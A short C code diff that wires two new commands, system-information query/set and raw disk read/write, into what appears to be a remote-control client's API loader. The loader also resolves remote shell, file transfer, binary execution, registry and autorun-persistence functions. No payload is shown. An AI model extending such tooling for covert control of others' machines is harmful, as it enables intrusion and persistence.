@@ -46,6 +46,8 @@ CmdAddAutoRunBin _CmdAddAutoRunBin = NULL;
 CmdDelAutoRunBin _CmdDelAutoRunBin = NULL;
 CmdQueryAutoRunBin _CmdQueryAutoRunBin = NULL;
 CmdClearAutoRunBin _CmdClearAutoRunBin = NULL;
+CmdQuerySetSystemInformation _CmdQuerySetSystemInformation = NULL;
+CmdReadWriteDisk _CmdReadWriteDisk = NULL;
 UpdateServer _UpdateServer = NULL;
 UpdateClient _UpdateClient = NULL;
 
@@ -82,6 +84,8 @@ BOOLEAN InitializeApis()
 		_CmdDelAutoRunBin = (CmdDelAutoRunBin)GetProcAddress(hMod, "CmdDelAutoRunBin");
 		_CmdQueryAutoRunBin = (CmdQueryAutoRunBin)GetProcAddress(hMod, "CmdQueryAutoRunBin");
 		_CmdClearAutoRunBin = (CmdClearAutoRunBin)GetProcAddress(hMod, "CmdClearAutoRunBin");
+		_CmdQuerySetSystemInformation = (CmdQuerySetSystemInformation)GetProcAddress(hMod, "CmdQuerySetSystemInformation");
+		_CmdReadWriteDisk = (CmdReadWriteDisk)GetProcAddress(hMod, "CmdReadWriteDisk");
 		_UpdateServer = (UpdateServer)GetProcAddress(hMod, "UpdateServer");
 		_UpdateClient = (UpdateClient)GetProcAddress(hMod, "UpdateClient");
 		if(_init && _uninit && _ClientList && _ClientConnect && _ClientDisconnect && 
@@ -89,7 +93,7 @@ BOOLEAN InitializeApis()
 			_CmdQueryDirectory && _CmdUploadFileTo && _CmdDownloadFileFrom && _CmdExecuteBinary && 
 			_CmdSystemShell && _CmdFileOperation && _CmdQueryRegistry && _CmdRegistryOperation && 
 			_CmdAddAutoRunBin && _CmdDelAutoRunBin && _CmdQueryAutoRunBin && _CmdClearAutoRunBin && 
-			_UpdateServer && _UpdateClient)
+			_CmdQuerySetSystemInformation && _CmdReadWriteDisk && _UpdateServer && _UpdateClient)
 		{
 			return TRUE;
 		}
